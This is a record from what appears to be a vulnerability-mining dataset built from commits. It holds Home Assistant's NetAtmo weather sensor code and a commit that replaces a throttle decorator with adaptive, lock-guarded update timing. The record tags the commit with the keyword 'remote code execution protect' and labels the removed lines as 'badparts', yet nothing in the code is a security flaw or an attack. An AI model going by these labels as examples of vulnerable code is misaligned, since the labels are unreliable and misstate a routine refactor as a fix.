'mdi:volume-high', None],\n    'humidity': ['Humidity', '%', None, DEVICE_CLASS_HUMIDITY],\n    'rain': ['Rain', 'mm', 'mdi:weather-rainy', None],\n    'sum_rain_1': ['sum_rain_1', 'mm', 'mdi:weather-rainy', None],\n    'sum_rain_24': ['sum_rain_24', 'mm', 'mdi:weather-rainy', None],\n    'battery_vp': ['Battery', '', 'mdi:battery', None],\n    'battery_lvl': ['Battery_lvl', '', 'mdi:battery', None],\n    'min_temp': ['Min Temp.', TEMP_CELSIUS, 'mdi:thermometer', None],\n    'max_temp': ['Max Temp.', TEMP_CELSIUS, 'mdi:thermometer', None],\n    'windangle': ['Angle', '', 'mdi:compass', None],\n    'windangle_value': ['Angle Value', '\u00ba', 'mdi:compass', None],\n    'windstrength': ['Strength', 'km/h', 'mdi:weather-windy', None],\n    'gustangle': ['Gust Angle', '', 'mdi:compass', None],\n    'gustangle_value': ['Gust Angle Value', '\u00ba', 'mdi:compass', None],\n    'guststrength': ['Gust Strength', 'km/h', 'mdi:weather-windy', None],\n    'rf_status': ['Radio', '', 'mdi:signal', None],\n    'rf_status_lvl': ['Radio_lvl', '', 'mdi:signal', None],\n    'wifi_status': ['Wifi', '', 'mdi:wifi', None],\n    'wifi_status_lvl': ['Wifi_lvl', 'dBm', 'mdi:wifi', None]\n}\n\nMODULE_SCHEMA = vol.Schema({\n    vol.Required(cv.string):\n        vol.All(cv.ensure_list, [vol.In(SENSOR_TYPES)]),\n})\n\nPLATFORM_SCHEMA = PLATFORM_SCHEMA.extend({\n    vol.Optional(CONF_STATION): cv.string,\n    vol.Optional(CONF_MODULES): MODULE_SCHEMA,\n})\n\n\ndef setup_platform(hass, config, add_devices, discovery_info=None):\n    \"\"\"Set up the available Netatmo weather sensors.\"\"\"\n    netatmo = hass.components.netatmo\n    data = NetAtmoData(netatmo.NETATMO_AUTH, config.get(CONF_STATION, None))\n\n    dev = []\n    import pyatmo\n    try:\n        if CONF_MODULES in config:\n            # Iterate each module\n            for module_name, monitored_conditions in\\\n                    config[CONF_MODULES].items():\n                # Test if module exist \"\"\"\n                if module_name not in data.get_module_names():\n                    _LOGGER.error('Module name: \"%s\" not found', module_name)\n                    continue\n                # Only create sensor for monitored \"\"\"\n                for variable in monitored_conditions:\n                    dev.append(NetAtmoSensor(data, module_name, variable))\n        else:\n            for module_name in data.get_module_names():\n                for variable in\\\n                        data.station_data.monitoredConditions(module_name):\n                    if variable in SENSOR_TYPES.keys():\n                        dev.append(NetAtmoSensor(data, module_name, variable))\n                    else:\n                        _LOGGER.warning(\"Ignoring unknown var %s for mod %s\",\n                                        variable, module_name)\n    except pyatmo.NoDevice:\n        return None\n\n    add_devices(dev, True)\n\n\nclass NetAtmoSensor(Entity):\n    \"\"\"Implementation of a Netatmo sensor.\"\"\"\n\n    def __init__(self, netatmo_data, module_name, sensor_type):\n        \"\"\"Initialize the sensor.\"\"\"\n        self._name = 'Netatmo {} {}'.format(module_name,\n                                            SENSOR_TYPES[sensor_type][0])\n        self.netatmo_data = netatmo_data\n        self.module_name = module_name\n        self.type = sensor_type\n        self._state = None\n        self._device_class = SENSOR_TYPES[self.type][3]\n        self._icon = SENSOR_TYPES[self.type][2]\n        self._unit_of_measurement = SENSOR_TYPES[self.type][1]\n        module_id = self.netatmo_data.\\\n            station_data.moduleByName(module=module_name)['_id']\n        self.module_id = module_id[1]\n\n    @property\n    def name(self):\n        \"\"\"Return the name of the sensor.\"\"\"\n        return self._name\n\n    @property\n    def icon(self):\n        \"\"\"Icon to use in the frontend, if any.\"\"\"\n        return self._icon\n\n    @property\n    def device_class(self):\n        \"\"\"Return the device class of the sensor.\"\"\"\n        return self._device_class\n\n    @property\n    def state(self):\n        \"\"\"Return the state of the device.\"\"\"\n        return self._state\n\n    @property\n    def unit_of_measurement(self):\n        \"\"\"Return the unit of measurement of this entity, if any.\"\"\"\n        return self._unit_of_measurement\n\n    def update(self):\n        \"\"\"Get the latest data from NetAtmo API and updates the states.\"\"\"\n        self.netatmo_data.update()\n        data = self.netatmo_data.data.get(self.module_name)\n\n        if data is None:\n            _LOGGER.warning(\"No data found for %s\", self.module_name)\n            self._state = STATE_UNKNOWN\n            return\n\n        if self.type == 'temperature':\n            self._state = round(data['Temperature'], 1)\n        elif self.type == 'humidity':\n            self._state = data['Humidity']\n        elif self.type == 'rain':\n            self._state = data['Rain']\n        elif self.type == 'sum_rain_1':\n            self._state = data['sum_rain_1']\n        elif self.type == 'sum_rain_24':\n            self._state = data['sum_rain_24']\n        elif self.type == 'noise':\n            self._state = data['Noise']\n        elif self.type == 'co2':\n            self._state = data['CO2']\n        elif self.type == 'pressure':\n            self._state = round(data['Pressure'], 1)\n        elif self.type == 'battery_lvl':\n            self._state = data['battery_vp']\n        elif self.type == 'battery_vp' and self.module_id == '6':\n            if data['battery_vp'] >= 5590:\n                self._state = \"Full\"\n            elif data['battery_vp'] >= 5180:\n                self._state = \"High\"\n            elif data['battery_vp'] >= 4770:\n                self._state = \"Medium\"\n            elif data['battery_vp'] >= 4360:\n                self._state = \"Low\"\n            elif data['battery_vp'] < 4360:\n                self._state = \"Very Low\"\n        elif self.type == 'battery_vp' and self.module_id == '5':\n            if data['battery_vp'] >= 5500:\n                self._state = \"Full\"\n            elif data['battery_vp'] >= 5000:\n                self._state = \"High\"\n            elif data['battery_vp'] >= 4500:\n                self._state = \"Medium\"\n            elif data['battery_vp'] >= 4000:\n                self._state = \"Low\"\n            elif data['battery_vp'] < 4000:\n                self._state = \"Very Low\"\n        elif self.type == 'battery_vp' and self.module_id == '3':\n            if data['battery_vp'] >= 5640:\n                self._state = \"Full\"\n            elif data['battery_vp'] >= 5280:\n                self._state = \"High\"\n            elif data['battery_vp'] >= 4920:\n                self._state = \"Medium\"\n            elif data['battery_vp'] >= 4560:\n                self._state = \"Low\"\n            elif data['battery_vp'] < 4560:\n                self._state = \"Very Low\"\n        elif self.type == 'battery_vp' and self.module_id == '2':\n            if data['battery_vp'] >= 5500:\n                self._state = \"Full\"\n            elif data['battery_vp'] >= 5000:\n                self._state = \"High\"\n            elif data['battery_vp'] >= 4500:\n                self._state = \"Medium\"\n            elif data['battery_vp'] >= 4000:\n                self._state = \"Low\"\n            elif data['battery_vp'] < 4000:\n                self._state = \"Very Low\"\n        elif self.type == 'min_temp':\n            self._state = data['min_temp']\n        elif self.type == 'max_temp':\n            self._state = data['max_temp']\n        elif self.type == 'windangle_value':\n            self._state = data['WindAngle']\n        elif self.type == 'windangle':\n            if data['WindAngle'] >= 330:\n                self._state = \"N (%d\\xb0)\" % data['WindAngle']\n            elif data['WindAngle'] >= 300:\n                self._state = \"NW (%d\\xb0)\" % data['WindAngle']\n            elif data['WindAngle'] >= 240:\n                self._state = \"W (%d\\xb0)\" % data['WindAngle']\n            elif data['WindAngle'] >= 210:\n                self._state = \"SW (%d\\xb0)\" % data['WindAngle']\n            elif data['WindAngle'] >= 150:\n                self._state = \"S (%d\\xb0)\" % data['WindAngle']\n            elif data['WindAngle'] >= 120:\n                self._state = \"SE (%d\\xb0)\" % data['WindAngle']\n            elif data['WindAngle'] >= 60:\n                self._state = \"E (%d\\xb0)\" % data['WindAngle']\n            elif data['WindAngle'] >= 30:\n                self._state = \"NE (%d\\xb0)\" % data['WindAngle']\n            elif data['WindAngle'] >= 0:\n                self._state = \"N (%d\\xb0)\" % data['WindAngle']\n        elif self.type == 'windstrength':\n            self._state = data['WindStrength']\n        elif self.type == 'gustangle_value':\n            self._state = data['GustAngle']\n        elif self.type == 'gustangle':\n            if data['GustAngle'] >= 330:\n                self._state = \"N (%d\\xb0)\" % data['GustAngle']\n            elif data['GustAngle'] >= 300:\n                self._state = \"NW (%d\\xb0)\" % data['GustAngle']\n            elif data['GustAngle'] >= 240:\n                self._state = \"W (%d\\xb0)\" % data['GustAngle']\n            elif data['GustAngle'] >= 210:\n                self._state = \"SW (%d\\xb0)\" % data['GustAngle']\n            elif data['GustAngle'] >= 150:\n                self._state = \"S (%d\\xb0)\" % data['GustAngle']\n            elif data['GustAngle'] >= 120:\n                self._state = \"SE (%d\\xb0)\" % data['GustAngle']\n            elif data['GustAngle'] >= 60:\n                self._state = \"E (%d\\xb0)\" % data['GustAngle']\n            elif data['GustAngle'] >= 30:\n                self._state = \"NE (%d\\xb0)\" % data['GustAngle']\n            elif data['GustAngle'] >= 0:\n                self._state = \"N (%d\\xb0)\" % data['GustAngle']\n        elif self.type == 'guststrength':\n            self._state = data['GustStrength']\n        elif self.type == 'rf_status_lvl':\n            self._state = data['rf_status']\n        elif self.type == 'rf_status':\n            if data['rf_status'] >= 90:\n                self._state = \"Low\"\n            elif data['rf_status'] >= 76:\n                self._state = \"Medium\"\n            elif data['rf_status'] >= 60:\n                self._state = \"High\"\n            elif data['rf_status'] <= 59:\n                self._state = \"Full\"\n        elif self.type == 'wifi_status_lvl':\n            self._state = data['wifi_status']\n        elif self.type == 'wifi_status':\n            if data['wifi_status'] >= 86:\n                self._state = \"Low\"\n            elif data['wifi_status'] >= 71:\n                self._state = \"Medium\"\n            elif data['wifi_status'] >= 56:\n                self._state = \"High\"\n            elif data['wifi_status'] <= 55:\n                self._state = \"Full\"\n\n\nclass NetAtmoData(object):\n    \"\"\"Get the latest data from NetAtmo.\"\"\"\n\n    def __init__(self, auth, station):\n        \"\"\"Initialize the data object.\"\"\"\n        self.auth = auth\n        self.data = None\n        self.station_data = None\n        self.station = station\n\n    def get_module_names(self):\n        \"\"\"Return all module available on the API as a list.\"\"\"\n        self.update()\n        return self.data.keys()\n\n    @Throttle(MIN_TIME_BETWEEN_UPDATES)\n    def update(self):\n        \"\"\"Call the Netatmo API to update the data.\"\"\"\n        import pyatmo\n        self.station_data = pyatmo.WeatherStationData(self.auth)\n\n        if self.station is not None:\n            self.data = self.station_data.lastData(\n                station=self.station, exclude=3600)\n        else:\n            self.data = self.station_data.lastData(exclude=3600)\n"}}, "msg": "Improve NetAtmo sensors update logic (#14866)\n\n* Added a \"last update\" sensor that could be used by automations + cosmetic changes\r\n\r\n* Improved the update logic of sensor data\r\n\r\nThe platform is now continuously adjusting the refresh interval\r\nin order to synchronize with the expected next update from the\r\nNetAtmo cloud. This significantly improves reaction time of\r\nautomations while keeping the refresh time to the recommended\r\nvalue (10 minutes).\r\n\r\n* Linting\r\n\r\n* Incorporated the advanced Throttle class to support adaptive\r\nthrottling, as opposed to integrating it in the core framework.\r\n\r\nFollowing code review, it was suggested to implement the\r\nspecialised Throttle class in this platform instead of making a\r\nchange in the general util package. Except that the required change\r\n(about 4 LoC) is part of the only relevant piece of code of that\r\nclass, therefore this commit includes a full copy of the Throttle\r\nclass from homeassistant.util, plus the extra feature to support\r\nadaptive throttling.\r\n\r\n* Cosmetic changes on the introduced \"last updated\" sensor\r\n\r\n* Alternate implementation for the adaptive throttling\r\n\r\nEnsure the updates from the cloud are throttled and adapted to the\r\nlast update time provided by NetAtmo, without using the Throttle\r\ndecorator. Similar logic and similar usage of a lock to protect\r\nthe execution of the remote update.\r\n\r\n* Linting"}}, "https://github.com/eric-erki/Home-assistant": {"9ea0c409e6cea69cce632079548165ad5a9f2554": {"url": "https://api.github.com/repos/eric-erki/Home-assistant/commits/9ea0c409e6cea69cce632079548165ad5a9f2554", "html_url": "https://github.com/eric-erki/Home-assistant/commit/9ea0c409e6cea69cce632079548165ad5a9f2554", "message": "Improve NetAtmo sensors update logic (#14866)\n\n* Added a \"last update\" sensor that could be used by automations + cosmetic changes\r\n\r\n* Improved the update logic of sensor data\r\n\r\nThe platform is now continuously adjusting the refresh interval\r\nin order to synchronize with the expected next update from the\r\nNetAtmo cloud. This significantly improves reaction time of\r\nautomations while keeping the refresh time to the recommended\r\nvalue (10 minutes).\r\n\r\n* Linting\r\n\r\n* Incorporated the advanced Throttle class to support adaptive\r\nthrottling, as opposed to integrating it in the core framework.\r\n\r\nFollowing code review, it was suggested to implement the\r\nspecialised Throttle class in this platform instead of making a\r\nchange in the general util package. Except that the required change\r\n(about 4 LoC) is part of the only relevant piece of code of that\r\nclass, therefore this commit includes a full copy of the Throttle\r\nclass from homeassistant.util, plus the extra feature to support\r\nadaptive throttling.\r\n\r\n* Cosmetic changes on the introduced \"last updated\" sensor\r\n\r\n* Alternate implementation for the adaptive throttling\r\n\r\nEnsure the updates from the cloud are throttled and adapted to the\r\nlast update time provided by NetAtmo, without using the Throttle\r\ndecorator. Similar logic and similar usage of a lock to protect\r\nthe execution of the remote update.\r\n\r\n* Linting", "sha": "9ea0c409e6cea69cce632079548165ad5a9f2554", "keyword": "remote code execution protect", "diff": "diff --git a/homeassistant/components/sensor/netatmo.py b/homeassistant/components/sensor/netatmo.py\nindex 191e587fe..bdc2c5990 100644\n--- a/homeassistant/components/sensor/netatmo.py\n+++ b/homeassistant/components/sensor/netatmo.py\n@@ -5,7 +5,8 @@\n https://home-assistant.io/components/sensor.netatmo/\n \"\"\"\n import logging\n-from datetime import timedelta\n+from time import time\n+import threading\n \n import voluptuous as vol\n \n@@ -14,7 +15,6 @@\n     TEMP_CELSIUS, DEVICE_CLASS_HUMIDITY, DEVICE_CLASS_TEMPERATURE,\n     STATE_UNKNOWN)\n from homeassistant.helpers.entity import Entity\n-from homeassistant.util import Throttle\n import homeassistant.helpers.config_validation as cv\n \n _LOGGER = logging.getLogger(__name__)\n@@ -24,8 +24,8 @@\n \n DEPENDENCIES = ['netatmo']\n \n-# NetAtmo Data is uploaded to server every 10 minutes\n-MIN_TIME_BETWEEN_UPDATES = timedelta(seconds=600)\n+# This is the NetAtmo data upload interval in seconds\n+NETATMO_UPDATE_INTERVAL = 600\n \n SENSOR_TYPES = {\n     'temperature': ['Temperature', TEMP_CELSIUS, None,\n@@ -50,7 +50,8 @@\n     'rf_status': ['Radio', '', 'mdi:signal', None],\n     'rf_status_lvl': ['Radio_lvl', '', 'mdi:signal', None],\n     'wifi_status': ['Wifi', '', 'mdi:wifi', None],\n-    'wifi_status_lvl': ['Wifi_lvl', 'dBm', 'mdi:wifi', None]\n+    'wifi_status_lvl': ['Wifi_lvl', 'dBm', 'mdi:wifi', None],\n+    'lastupdated': ['Last Updated', 's', 'mdi:timer', None],\n }\n \n MODULE_SCHEMA = vol.Schema({\n@@ -76,11 +77,11 @@ def setup_platform(hass, config, add_devices, discovery_info=None):\n             # Iterate each module\n             for module_name, monitored_conditions in\\\n                     config[CONF_MODULES].items():\n-                # Test if module exist \"\"\"\n+                # Test if module exists\n                 if module_name not in data.get_module_names():\n                     _LOGGER.error('Module name: \"%s\" not found', module_name)\n                     continue\n-                # Only create sensor for monitored \"\"\"\n+                # Only create sensors for monitored properties\n                 for variable in monitored_conditions:\n                     dev.append(NetAtmoSensor(data, module_name, variable))\n         else:\n@@ -285,6 +286,8 @@ def update(self):\n                 self._state = \"High\"\n             elif data['wifi_status'] <= 55:\n                 self._state = \"Full\"\n+        elif self.type == 'lastupdated':\n+            self._state = int(time() - data['When'])\n \n \n class NetAtmoData(object):\n@@ -296,20 +299,57 @@ def __init__(self, auth, station):\n         self.data = None\n         self.station_data = None\n         self.station = station\n+        self._next_update = time()\n+        self._update_in_progress = threading.Lock()\n \n     def get_module_names(self):\n         \"\"\"Return all module available on the API as a list.\"\"\"\n         self.update()\n         return self.data.keys()\n \n-    @Throttle(MIN_TIME_BETWEEN_UPDATES)\n     def update(self):\n-        \"\"\"Call the Netatmo API to update the data.\"\"\"\n-        import pyatmo\n-        self.station_data = pyatmo.WeatherStationData(self.auth)\n+        \"\"\"Call the Netatmo API to update the data.\n \n-        if self.station is not None:\n-            self.data = self.station_data.lastData(\n-                station=self.station, exclude=3600)\n-        else:\n-            self.data = self.station_data.lastData(exclude=3600)\n+        This method is not throttled by the builtin Throttle decorator\n+        but with a custom logic, which takes into account the time\n+        of the last update from the cloud.\n+        \"\"\"\n+        if time() < self._next_update or \\\n+                not self._update_in_progress.acquire(False):\n+            return\n+\n+        try:\n+            import pyatmo\n+            self.station_data = pyatmo.WeatherStationData(self.auth)\n+\n+            if self.station is not None:\n+                self.data = self.station_data.lastData(\n+                    station=self.station, exclude=3600)\n+            else:\n+                self.data = self.station_data.lastData(exclude=3600)\n+\n+            newinterval = 0\n+            for module in self.data:\n+                if 'When' in self.data[module]:\n+                    newinterval = self.data[module]['When']\n+                    break\n+            if newinterval:\n+                # Try and estimate when fresh data will be available\n+                newinterval += NETATMO_UPDATE_INTERVAL - time()\n+                if newinterval > NETATMO_UPDATE_INTERVAL - 30:\n+                    newinterval = NETATMO_UPDATE_INTERVAL\n+                else:\n+                    if newinterval < NETATMO_UPDATE_INTERVAL / 2:\n+                        # Never hammer the NetAtmo API more than\n+                        # twice per update interval\n+                        newinterval = NETATMO_UPDATE_INTERVAL / 2\n+                    _LOGGER.warning(\n+                        \"NetAtmo refresh interval reset to %d seconds\",\n+                        newinterval)\n+            else:\n+                # Last update time not found, fall back to default value\n+                newinterval = NETATMO_UPDATE_INTERVAL\n+\n+            self._next_update = time() + newinterval\n+        finally:\n+            self._update_in_progress.release()\n", "files": {"/homeassistant/components/sensor/netatmo.py": {"changes": [{"diff": "\n https://home-assistant.io/components/sensor.netatmo/\n \"\"\"\n import logging\n-from datetime import timedelta\n+from time import time\n+import threading\n \n import voluptuous as vol\n \n", "add": 2, "remove": 1, "filename": "/homeassistant/components/sensor/netatmo.py", "badparts": ["from datetime import timedelta"], "goodparts": ["from time import time", "import threading"]}, {"diff": "\n     STATE_UNKNOWN)\n from homeassistant.helpers.entity import Entity\n-from homeassistant.util import Throttle\n import homeassistant.helpers.config_validation as cv\n \n _LOGGER = logging.getLogger(__name__)\n", "add": 0, "remove": 1, "filename": "/homeassistant/components/sensor/netatmo.py", "badparts": ["from homeassistant.util import Throttle"], "goodparts": []}, {"diff": "\n DEPENDENCIES = ['netatmo']\n \n-# NetAtmo Data is uploaded to server every 10 minutes\n-MIN_TIME_BETWEEN_UPDATES = timedelta(seconds=600)\n+# This is the NetAtmo data upload interval in seconds\n+NETATMO_UPDATE_INTERVAL = 600\n \n SENSOR_TYPES = {\n     'temperature': ['Temperature', TEMP_CELSIUS, None,\n", "add": 2, "remove": 2, "filename": "/homeassistant/components/sensor/netatmo.py", "badparts": ["MIN_TIME_BETWEEN_UPDATES = timedelta(seconds=600)"], "goodparts": ["NETATMO_UPDATE_INTERVAL = 600"]}, {"diff": "\n     'rf_status_lvl': ['Radio_lvl', '', 'mdi:signal', None],\n     'wifi_status': ['Wifi', '', 'mdi:wifi', None],\n-    'wifi_status_lvl': ['Wifi_lvl', 'dBm', 'mdi:wifi', None]\n+    'wifi_status_lvl': ['Wifi_lvl', 'dBm', 'mdi:wifi', None],\n+    'lastupdated': ['Last Updated', 's', 'mdi:timer', None],\n }\n \n MODULE_SCHEMA = vol.Schema({\n", "add": 2, "remove": 1, "filename": "/homeassistant/components/sensor/netatmo.py", "badparts": ["    'wifi_status_lvl': ['Wifi_lvl', 'dBm', 'mdi:wifi', None]"], "goodparts": ["    'wifi_status_lvl': ['Wifi_lvl', 'dBm', 'mdi:wifi', None],", "    'lastupdated': ['Last Updated', 's', 'mdi:timer', None],"]}, {"diff": "\n         self.data = None\n         self.station_data = None\n         self.station = station\n+        self._next_update = time()\n+        self._update_in_progress = threading.Lock()\n \n     def get_module_names(self):\n         \"\"\"Return all module available on the API as a list.\"\"\"\n         self.update()\n         return self.data.keys()\n \n-    @Throttle(MIN_TIME_BETWEEN_UPDATES)\n     def update(self):\n-        \"\"\"Call the Netatmo API to update the data.\"\"\"\n-        import pyatmo\n-        self.station_data = pyatmo.WeatherStationData(self.auth)\n+        \"\"\"Call the Netatmo API to update the data.\n \n-        if self.station is not None:\n-            self.data = self.station_data.lastData(\n-                station=self.station, exclude=3600)\n-        else:\n-            self.data = self.station_data.lastData(exclude=3600)\n+        This method is not throttled by the builtin Throttle decorator\n+        but with a custom logic, which takes into account the time\n+        of the last update from the cloud.\n+        \"\"\"\n+        if time() < self._next_update or \\\n+                not self._update_in_progress.acquire(False):\n+            return\n+\n+        try:\n+            import pyatmo\n+            self.station_data = pyatmo.WeatherStationData(self.auth)\n+\n+            if self.station is not None:\n+                self.data = self.station_data.lastData(\n+                    station=self.station, exclude=3600)\n+            else:\n+                self.data = self.station_data.lastData(exclude=3600)\n+\n+            newinterval = 0\n+            for module in self.data:\n+                if 'When' in self.data[module]:\n+                    newinterval = self.data[module]['When']\n+                    break\n+            if newinterval:\n+                # Try and estimate when fresh data will be available\n+                newinterval += NETATMO_UPDATE_INTERVAL - time()\n+                if newinterval > NETATMO_UPDATE_INTERVAL - 30:\n+                    newinterval = NETATMO_UPDATE_INTERVAL\n+                else:\n+                    if newinterval < NETATMO_UPDATE_INTERVAL / 2:\n+                        # Never hammer the NetAtmo API more than\n+                        # twice per update interval\n+                        newinterval = NETATMO_UPDATE_INTERVAL / 2\n+                    _LOGGER.warning(\n+                        \"NetAtmo refresh interval reset to %d seconds\",\n+                        newinterval)\n+            else:\n+                # Last update time not found, fall back to default value\n+                newinterval = NETATMO_UPDATE_INTERVAL\n+\n+            self._next_update = time() + newinterval\n+        finally:\n+            self._update_in_progress.release()\n", "add": 46, "remove": 9, "filename": "/homeassistant/components/sensor/netatmo.py", "badparts": ["    @Throttle(MIN_TIME_BETWEEN_UPDATES)", "        \"\"\"Call the Netatmo API to update the data.\"\"\"", "        import pyatmo", "        self.station_data = pyatmo.WeatherStationData(self.auth)", "        if self.station is not None:", "            self.data = self.station_data.lastData(", "                station=self.station, exclude=3600)", "        else:", "            self.data = self.station_data.lastData(exclude=3600)"], "goodparts": ["        self._next_update = time()", "        self._update_in_progress = threading.Lock()", "        \"\"\"Call the Netatmo API to update the data.", "        This method is not throttled by the builtin Throttle decorator", "        but with a custom logic, which takes into account the time", "        of the last update from the cloud.", "        \"\"\"", "        if time() < self._next_update or \\", "                not self._update_in_progress.acquire(False):", "            return", "        try:", "            import pyatmo", "            self.station_data = pyatmo.WeatherStationData(self.auth)", "            if self.station is not None:", "                self.data = self.station_data.lastData(", "                    station=self.station, exclude=3600)", "            else:", "                self.data = self.station_data.lastData(exclude=3600)", "            newinterval = 0", "            for module in self.data:", "                if 'When' in self.data[module]:", "                    newinterval = self.data[module]['When']", "                    break", "            if newinterval:", "                newinterval += NETATMO_UPDATE_INTERVAL - time()", "                if newinterval > NETATMO_UPDATE_INTERVAL - 30:", "                    newinterval = NETATMO_UPDATE_INTERVAL", "                else:", "                    if newinterval < NETATMO_UPDATE_INTERVAL / 2:", "                        newinterval = NETATMO_UPDATE_INTERVAL / 2", "                    _LOGGER.warning(", "                        \"NetAtmo refresh interval reset to %d seconds\",", "                        newinterval)", "            else:", "                newinterval = NETATMO_UPDATE_INTERVAL", "            self._next_update = time() + newinterval", "        finally:", "            self._update_in_progress.release()"]}], "source": "\n\"\"\" Support for the NetAtmo Weather Service. For more details about this platform, please refer to the documentation at https://home-assistant.io/components/sensor.netatmo/ \"\"\" import logging from datetime import timedelta import voluptuous as vol from homeassistant.components.sensor import PLATFORM_SCHEMA from homeassistant.const import( TEMP_CELSIUS, DEVICE_CLASS_HUMIDITY, DEVICE_CLASS_TEMPERATURE, STATE_UNKNOWN) from homeassistant.helpers.entity import Entity from homeassistant.util import Throttle import homeassistant.helpers.config_validation as cv _LOGGER=logging.getLogger(__name__) CONF_MODULES='modules' CONF_STATION='station' DEPENDENCIES=['netatmo'] MIN_TIME_BETWEEN_UPDATES=timedelta(seconds=600) SENSOR_TYPES={ 'temperature':['Temperature', TEMP_CELSIUS, None, DEVICE_CLASS_TEMPERATURE], 'co2':['CO2', 'ppm', 'mdi:cloud', None], 'pressure':['Pressure', 'mbar', 'mdi:gauge', None], 'noise':['Noise', 'dB', 'mdi:volume-high', None], 'humidity':['Humidity', '%', None, DEVICE_CLASS_HUMIDITY], 'rain':['Rain', 'mm', 'mdi:weather-rainy', None], 'sum_rain_1':['sum_rain_1', 'mm', 'mdi:weather-rainy', None], 'sum_rain_24':['sum_rain_24', 'mm', 'mdi:weather-rainy', None], 'battery_vp':['Battery', '', 'mdi:battery', None], 'battery_lvl':['Battery_lvl', '', 'mdi:battery', None], 'min_temp':['Min Temp.', TEMP_CELSIUS, 'mdi:thermometer', None], 'max_temp':['Max Temp.', TEMP_CELSIUS, 'mdi:thermometer', None], 'windangle':['Angle', '', 'mdi:compass', None], 'windangle_value':['Angle Value', '\u00ba', 'mdi:compass', None], 'windstrength':['Strength', 'km/h', 'mdi:weather-windy', None], 'gustangle':['Gust Angle', '', 'mdi:compass', None], 'gustangle_value':['Gust Angle Value', '\u00ba', 'mdi:compass', None], 'guststrength':['Gust Strength', 'km/h', 'mdi:weather-windy', None], 'rf_status':['Radio', '', 'mdi:signal', None], 'rf_status_lvl':['Radio_lvl', '', 'mdi:signal', None], 'wifi_status':['Wifi', '', 'mdi:wifi', None], 'wifi_status_lvl':['Wifi_lvl', 'dBm', 'mdi:wifi', None] } MODULE_SCHEMA=vol.Schema({ vol.Required(cv.string): vol.All(cv.ensure_list,[vol.In(SENSOR_TYPES)]), }) PLATFORM_SCHEMA=PLATFORM_SCHEMA.extend({ vol.Optional(CONF_STATION): cv.string, vol.Optional(CONF_MODULES): MODULE_SCHEMA, }) def setup_platform(hass, config, add_devices, discovery_info=None): \"\"\"Set up the available Netatmo weather sensors.\"\"\" netatmo=hass.components.netatmo data=NetAtmoData(netatmo.NETATMO_AUTH, config.get(CONF_STATION, None)) dev=[] import pyatmo try: if CONF_MODULES in config: for module_name, monitored_conditions in\\ config[CONF_MODULES].items(): if module_name not in data.get_module_names(): _LOGGER.error('Module name: \"%s\" not found', module_name) continue for variable in monitored_conditions: dev.append(NetAtmoSensor(data, module_name, variable)) else: for module_name in data.get_module_names(): for variable in\\ data.station_data.monitoredConditions(module_name): if variable in SENSOR_TYPES.keys(): dev.append(NetAtmoSensor(data, module_name, variable)) else: _LOGGER.warning(\"Ignoring unknown var %s for mod %s\", variable, module_name) except pyatmo.NoDevice: return None add_devices(dev, True) class NetAtmoSensor(Entity): \"\"\"Implementation of a Netatmo sensor.\"\"\" def __init__(self, netatmo_data, module_name, sensor_type): \"\"\"Initialize the sensor.\"\"\" self._name='Netatmo{}{}'.format(module_name, SENSOR_TYPES[sensor_type][0]) self.netatmo_data=netatmo_data self.module_name=module_name self.type=sensor_type self._state=None self._device_class=SENSOR_TYPES[self.type][3] self._icon=SENSOR_TYPES[self.type][2] self._unit_of_measurement=SENSOR_TYPES[self.type][1] module_id=self.netatmo_data.\\ station_data.moduleByName(module=module_name)['_id'] self.module_id=module_id[1] @property def name(self): \"\"\"Return the name of the sensor.\"\"\" return self._name @property def icon(self): \"\"\"Icon to use in the frontend, if any.\"\"\" return self._icon @property def device_class(self): \"\"\"Return the device class of the sensor.\"\"\" return self._device_class @property def state(self): \"\"\"Return the state of the device.\"\"\" return self._state @property def unit_of_measurement(self): \"\"\"Return the unit of measurement of this entity, if any.\"\"\" return self._unit_of_measurement def update(self): \"\"\"Get the latest data from NetAtmo API and updates the states.\"\"\" self.netatmo_data.update() data=self.netatmo_data.data.get(self.module_name) if data is None: _LOGGER.warning(\"No data found for %s\", self.module_name) self._state=STATE_UNKNOWN return if self.type=='temperature': self._state=round(data['Temperature'], 1) elif self.type=='humidity': self._state=data['Humidity'] elif self.type=='rain': self._state=data['Rain'] elif self.type=='sum_rain_1': self._state=data['sum_rain_1'] elif self.type=='sum_rain_24': self._state=data['sum_rain_24'] elif self.type=='noise': self._state=data['Noise'] elif self.type=='co2': self._state=data['CO2'] elif self.type=='pressure': self._state=round(data['Pressure'], 1) elif self.type=='battery_lvl': self._state=data['battery_vp'] elif self.type=='battery_vp' and self.module_id=='6': if data['battery_vp'] >=5590: self._state=\"Full\" elif data['battery_vp'] >=5180: self._state=\"High\" elif data['battery_vp'] >=4770: self._state=\"Medium\" elif data['battery_vp'] >=4360: self._state=\"Low\" elif data['battery_vp'] < 4360: self._state=\"Very Low\" elif self.type=='battery_vp' and self.module_id=='5': if data['battery_vp'] >=5500: self._state=\"Full\" elif data['battery_vp'] >=5000: self._state=\"High\" elif data['battery_vp'] >=4500: self._state=\"Medium\" elif data['battery_vp'] >=4000: self._state=\"Low\" elif data['battery_vp'] < 4000: self._state=\"Very Low\" elif self.type=='battery_vp' and self.module_id=='3': if data['battery_vp'] >=5640: self._state=\"Full\" elif data['battery_vp'] >=5280: self._state=\"High\" elif data['battery_vp'] >=4920: self._state=\"Medium\" elif data['battery_vp'] >=4560: self._state=\"Low\" elif data['battery_vp'] < 4560: self._state=\"Very Low\" elif self.type=='battery_vp' and self.module_id=='2': if data['battery_vp'] >=5500: self._state=\"Full\" elif data['battery_vp'] >=5000: self._state=\"High\" elif data['battery_vp'] >=4500: self._state=\"Medium\" elif data['battery_vp'] >=4000: self._state=\"Low\" elif data['battery_vp'] < 4000: self._state=\"Very Low\" elif self.type=='min_temp': self._state=data['min_temp'] elif self.type=='max_temp': self._state=data['max_temp'] elif self.type=='windangle_value': self._state=data['WindAngle'] elif self.type=='windangle': if data['WindAngle'] >=330: self._state=\"N(%d\\xb0)\" % data['WindAngle'] elif data['WindAngle'] >=300: self._state=\"NW(%d\\xb0)\" % data['WindAngle'] elif data['WindAngle'] >=240: self._state=\"W(%d\\xb0)\" % data['WindAngle'] elif data['WindAngle'] >=210: self._state=\"SW(%d\\xb0)\" % data['WindAngle'] elif data['WindAngle'] >=150: self._state=\"S(%d\\xb0)\" % data['WindAngle'] elif data['WindAngle'] >=120: self._state=\"SE(%d\\xb0)\" % data['WindAngle'] elif data['WindAngle'] >=60: self._state=\"E(%d\\xb0)\" % data['WindAngle'] elif data['WindAngle'] >=30: self._state=\"NE(%d\\xb0)\" % data['WindAngle'] elif data['WindAngle'] >=0: self._state=\"N(%d\\xb0)\" % 